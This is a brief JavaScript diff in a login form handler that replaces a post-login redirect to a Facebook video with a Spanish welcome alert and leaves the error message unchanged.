@@ -20,7 +20,7 @@ document.addEventListener('DOMContentLoaded', function() {
         email: email,
         password: password
       }).then(function(response) {
-           window.location.href = "https://www.facebook.com/watch?v=1506234240078450&locale=es_LA"
+        alert("¡Bienvenido!");
       }, function(error) {
           alert("No puedes acceder❌");
       });
